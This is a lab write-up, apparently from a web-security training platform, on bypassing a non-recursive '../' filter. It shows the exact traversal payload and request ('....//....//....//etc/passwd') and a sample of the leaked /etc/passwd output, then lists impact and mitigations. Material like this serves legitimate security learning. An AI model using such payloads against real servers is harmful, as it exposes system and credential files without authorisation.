# Lab: File Path Traversal, Sequences Stripes Non-Recursively

## Overview
This lab is vulnerable to a file path traversal attack. The application attempts to block traversal sequences by stripping `../` from user input, but the filtering is implemented incorrectly and can be bypassed.

## Objective
Exploit the path traversal vulnerability to retrieve the contents of the `/etc/passwd` file.

## Tools Used
- Burp Suite (Proxy, HTTP History, Repeater)
- Browser (Firefox)

## Vulnerability Explanation
The application loads image files using a request similar to:

```bash
/image?filename=58.jpg
```

The server tries to prevent path traversal attacks by removing instances of:

```bash
../
```

However, the filtering is performed only once (non-recursively).

By using specially crafted payloads, traversal sequences still remain after filtering.

Payload used:

```bash
....//....//....//etc/passwd
```

When the server removes `../` once, the remaining payload becomes:

```bash
../../../etc/passwd
```

This successfully traverses directories and accesses sensitive files on the server.

## Steps to Reproduce

1. Open the lab in the browser.
2. Turn ON Burp Suite Proxy.
3. Visit any product page.
4. Go to **HTTP History** in Burp Suite.
5. Find the image request:

```bash
GET /image?filename=58.jpg
```

6. Right-click the request → **Send to Repeater**.
7. Modify the request parameter to:

```bash
GET /image?filename=....//....//....//etc/passwd
```

8. Click **Send**.
9. Observe the response from the server.

## Proof of Concept

The server responds with contents of the `/etc/passwd` file:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

This confirms successful exploitation of the path traversal vulnerability.

## Payload Used

```bash
....//....//....//etc/passwd
```

## Impact

- Unauthorized access to sensitive files
- Disclosure of usernames and system information
- Possible further exploitation of the server
- Increased risk of privilege escalation

## Mitigation

- Normalize paths before validation
- Use strict allowlists for filenames
- Block traversal sequences after normalization
- Restrict file access to intended directories only
- Avoid directly using user-controlled input in file operations

## Key Learnings

- Learned how non-recursive filtering can be bypassed
- Understood how traversal payloads are crafted
- Practiced using Burp Suite Repeater
- Learned how improper sanitization leads to sensitive data exposure
